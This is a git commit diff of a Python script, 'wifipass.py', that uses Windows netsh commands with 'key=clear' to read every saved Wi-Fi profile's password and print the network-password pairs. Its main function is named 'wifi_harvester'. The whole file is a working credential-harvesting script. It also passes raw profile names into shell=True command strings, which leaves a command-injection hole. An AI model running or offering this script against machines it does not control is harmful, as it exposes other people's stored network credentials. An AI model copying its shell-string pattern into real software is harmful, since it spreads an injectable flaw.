18bf9f2f2446dc9d453114ab0b9cc56886464cea
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-31 09:39:37 -0400

    final0(o/p simpliied)

--- wifipass.py
+++ wifipass.py
@@ -2,21 +2,31 @@
 import subprocess
 import re
 
-cmd = "netsh wlan show profile"
-network = subprocess.check_output(cmd, shell=True)
-network = network.decode('utf-8')
-net_names = re.findall("(?:Profile\s*:\s)(.*)", network)
+def get_passwd(wifi):
+    cmd = "netsh wlan show profile " + wifi + " key=clear"
+    wifi_info = subprocess.check_output(cmd, shell=True)
+    wifi_info=wifi_info.decode('utf-8')
+    wifi_pass = re.search("(?:Key Content\s*:\s)(.*)", wifi_info)
+    return wifi_pass
 
-result = {}
-for wifi in net_names:
-    cmd = "netsh wlan show profile " + wifi
-    net_profile = subprocess.check_output(cmd, shell=True)
-    net_profile =net_profile.decode('utf-8')
-    if not "no such wireless interface" in net_profile:
-        cmd = "netsh wlan show profile " + wifi + " key=clear"
-        wifi_info = subprocess.check_output(cmd, shell=True)
-        wifi_info = wifi_info.decode('utf-8')
-        wifi_pass = re.search("(?:Key Content\s*:\s)(.*)", wifi_info)
-        if wifi_pass:
-            result[wifi] = wifi_pass.group(1)
-print(result)
+def wifi_harvester():
+    cmd = "netsh wlan show profile"
+    network = subprocess.check_output(cmd, shell=True)
+    network = network.decode('utf-8')
+    net_names = re.findall("(?:Profile\s*:\s)(.*)", network)
+    result = {}
+    for wifi in net_names:
+        cmd = "netsh wlan show profile " + wifi
+        net_profile = subprocess.check_output(cmd, shell=True)
+        net_profile = net_profile.decode('utf-8')
+        if not "no such wireless interface" in net_profile:
+            wifi_pass = get_passwd(wifi)
+            if wifi_pass:
+                result[wifi] = wifi_pass.group(1)
+    return result
+
+credentials = wifi_harvester()
+message = ""
+for wifi in credentials:
+    message = message + wifi.rstrip() +  " ----> " + credentials[wifi].rstrip() + "\n"
+print(message)
